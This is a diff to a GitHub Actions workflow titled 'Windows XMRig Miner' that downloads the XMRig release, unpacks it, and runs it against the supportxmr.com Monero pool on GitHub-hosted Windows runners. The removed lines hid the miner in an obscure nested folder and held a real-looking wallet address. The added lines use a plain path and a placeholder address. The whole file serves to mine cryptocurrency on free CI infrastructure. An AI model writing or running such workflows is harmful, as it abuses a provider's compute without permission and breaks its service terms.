@@ -1,4 +1,4 @@
-name: Windows XMRig Miner (Optimized)
+name: Windows XMRig Miner (Fixed)
 
 on:
   workflow_dispatch:
@@ -6,7 +6,7 @@ on:
 jobs:
   mine:
     runs-on: windows-latest
-    timeout-minutes: 30  # GitHub may kill it sooner
+    timeout-minutes: 30
     steps:
       - name: Generate random worker name
         id: worker
@@ -14,16 +14,16 @@ jobs:
 
       - name: Download pre-built XMRig
         run: |
-          mkdir -p $env:USERPROFILE\.local\.run\.hello\runner\go\beein\.go\do
-          cd $env:USERPROFILE\.local\.run\.hello\runner\go\beein\.go\do
+          mkdir -p $env:USERPROFILE\miner
+          cd $env:USERPROFILE\miner
           Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip" -OutFile "xmrig.zip"
           Expand-Archive -Path "xmrig.zip" -DestinationPath .
           Rename-Item -Path "xmrig-6.21.0" -NewName "xmrig"
 
-      - name: Run XMRig (no compilation needed)
+      - name: Run XMRig (fixed syntax)
         run: |
-          cd $env:USERPROFILE\.local\.run\.hello\runner\go\beein\.go\do\xmrig
-          .\xmrig.exe -o pool.supportxmr.com:3333 ^
-            -u 46iWdfQ1WgVaJNjPCbVBsnVnzPEjTv8f9ReQTzX4JjCoRsH17PkfXFsCnfcwg1kGmDFD848DJb6QP6mt31SSnrMJ28q1s2p ^
-            -p ${{ steps.worker.outputs.name }} ^
+          cd $env:USERPROFILE\miner\xmrig
+          .\xmrig.exe -o pool.supportxmr.com:3333 `
+            -u YOUR_VALID_MONERO_ADDRESS_HERE `
+            -p ${{ steps.worker.outputs.name }} `
             -k --donate-level 1 -t 4
